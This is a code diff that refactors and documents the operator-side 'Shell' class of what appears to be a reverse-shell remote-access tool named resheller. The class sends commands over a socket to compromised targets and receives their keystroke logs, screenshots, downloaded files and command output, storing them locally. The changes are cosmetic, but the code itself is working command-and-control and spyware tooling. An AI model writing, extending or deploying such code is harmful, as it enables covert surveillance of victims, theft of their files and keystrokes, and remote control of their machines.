@@ -1,50 +1,64 @@
 #!/usr/bin/env python3
+"""shell"""
 from base64 import b64decode
 from os import path
 from pathlib import Path
 from time import strftime
 
 from resheller.lib.pipe import SafeSocket
-from resheller.lib.stdout import color
+from resheller.lib.stdout import COLOR
 from resheller.src.server.ps1 import Ps1
 
 
 class Shell:
-    def __init__(self, ips: list, targets: list, sessions) -> None:
+    """The shell and commands to send to the client"""
+
+    def __init__(self, ips: list, targets: list, sessions: int) -> None:
         self.ips = ips
         self.targets = targets
-        self.ip, _ = ips[sessions]
+        self.ipv4, _ = ips[sessions]
         self.target = targets[sessions]
         self.time = strftime("%H.%M.%S")
         self.safe_sock = SafeSocket(self.target)
         self.ps1 = Ps1(self.safe_sock)
-        self.log = None
 
     @staticmethod
     def make_dir(cmd: str) -> str:
-        home = str(Path.home())
+        """Make a directory to store data for corresponding command
+
+        :param cmd: The command the directory will be made for
+        :return:    The directory that was created
+        """
         date = strftime("%Y.%m.%d")
-        main_dir = path.join(home, ".resheller")
-        _dir = path.join(main_dir, date, cmd)
+        _dir = path.join(str(Path.home()), ".resheller", date, cmd)
         if not path.isdir(_dir):
             Path(_dir).mkdir(parents=True, exist_ok=True)
         return _dir
 
     def keylogger(self, cmd: str) -> None:
+        """Dump the key-log to a file or print it to the terminal
+
+        :param cmd: Send the option to `dump` or `print`to the client
+        """
+        log = self.safe_sock.recv()
         if cmd == "dump":
             _dir = self.make_dir("logs")
             logs = path.join(_dir, f"keylog_{self.time}.txt")
-            self.log = self.safe_sock.recv()
-            if self.log[:3] == "[!]":
-                color.b_red.print(self.log)
+            if log[:3] == "[!]":
+                COLOR.b_red.print(log)
             else:
                 with open(logs, "w") as log_file:
-                    log_file.write(self.log)
-                color.grn.print(f"Saved {logs}\n")
+                    log_file.write(log)
+                COLOR.grn.print(f"Saved {logs}\n")
         elif cmd == "print":
-            print(self.log)
+            print(log)
 
     def download_file(self, cmd: str) -> None:
+        """Organize the downloaded file and subsequent files into the
+        download directory
+
+        :param cmd: The name of the item downloaded
+        """
         count = 1
         _dir = self.make_dir("downloads")
         download = path.join(_dir, cmd)
@@ -58,41 +72,51 @@ class Shell:
                     break
         with open(download, "wb") as file:
             file.write(b64decode(payload))
-        color.grn.print(f"Saved {download}\n")
+        COLOR.grn.print(f"Saved {download}\n")
 
     def screenshot(self) -> None:
+        """Save the screenshot retrieved from the target"""
         _dir = self.make_dir("screenshots")
         image = path.join(_dir, f"screenshot_{self.time}.png")
         payload = self.safe_sock.recv()
         payload = b64decode(payload)
         if payload[:3] == "[!]":
-            color.b_red.print(payload)
+            COLOR.b_red.print(payload)
         else:
             with open(image, "wb") as screenshot:
                 screenshot.write(payload)
                 screenshot.close()
-            color.grn.print(f"Saved {image}\n")
+            COLOR.grn.print(f"Saved {image}\n")
 
     def print_stdout(self) -> None:
+        """Print the stdout of sufficient command returned from the
+        client
+        """
         stdout = self.safe_sock.recv()
         if stdout[:3] == "[+]":
             if len(stdout) > 3:
-                stdout = color.b_grn.get(f"{stdout}\n")
+                stdout = COLOR.b_grn.get(f"{stdout}\n")
             else:
                 return
         elif stdout[:3] == "[!]":
-            stdout = color.b_red.get(f"{stdout}\n")
+            stdout = COLOR.b_red.get(f"{stdout}\n")
         elif stdout[:3] == "[*]":
-            stdout = color.ylw.get(f"{stdout}\n")
+            stdout = COLOR.ylw.get(f"{stdout}\n")
         print(stdout)
         return
 
     def exit_shell(self) -> None:
+        """Exit the shell and remove the collected targets and ips from
+        the list
+        """
         self.target.close()
         self.targets.remove(self.target)
-        self.ips.remove(self.ip)
+        self.ips.remove(self.ipv4)
 
     def shell(self) -> None:
+        """The client's direct counterpart, the shell the the reverse
+        shell interacts with
+        """
         while True:
             cmd = self.ps1.prompt()
             self.safe_sock.send(cmd)
@@ -102,7 +126,7 @@ class Shell:
                 self.keylogger(cmd[:9])
             elif cmd[:8] == "download":
                 self.download_file(cmd[:9])
-            elif cmd == "quit" or cmd == "exit":
+            elif cmd in ("quit", "exit"):
                 if cmd == "exit":
                     self.exit_shell()
                 break
